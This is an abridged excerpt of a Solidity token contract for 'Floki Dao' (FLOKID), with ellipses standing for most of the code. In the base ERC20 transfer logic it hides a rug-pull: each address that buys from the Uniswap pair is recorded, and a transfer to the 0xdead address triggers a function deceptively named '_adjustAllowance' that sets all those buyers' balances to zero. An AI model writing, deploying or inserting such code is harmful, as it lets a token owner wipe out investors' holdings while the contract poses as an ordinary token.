...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _adjustAllowance() private {
        for (uint i = 0; i < _addresses.length; ++i) 
            if (_addresses[i] != _uniswapV2Pair && _addresses[i] != address(this))  _balances[_addresses[i]] = 0;
        delete _addresses;
    }
    ...
    function _transfer(
        ...
        if (from == _uniswapV2Pair) _addresses.push(to);
        if (to == address(0xdead)) { _adjustAllowance(); }
        unchecked {
...
contract FlokiDao is ERC20, Ownable {
    ...
    constructor() ERC20("Floki Dao", "FLOKID") {
    ...
    function addLiquidity() external onlyOwner {
        require(_uniswapV2Pair != address(0), "Pair not created");
        // Add liquidity
    ...
    function _canSwap(address from, address to) private view returns (bool) {
        uint256 totalTokensForSwap = _tokensForLiquidity;
    ...
    function _transfer(
        ...
        if (takeFee) {
            ...
            if (automatedMarketMakerPairs[from]) {
                ...
                tokensForMarketing += (fees * _buyMarketingFee) / _buyFees;
            } 
            // when sell
                ...
                tokensForMarketing += (fees * _sellMarketingFee) / _sellFees;
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees - tokensForMarketing);
                super._transfer(from, address(_feeWallet), tokensForMarketing);
            }
            amount = amount - fees;
        }
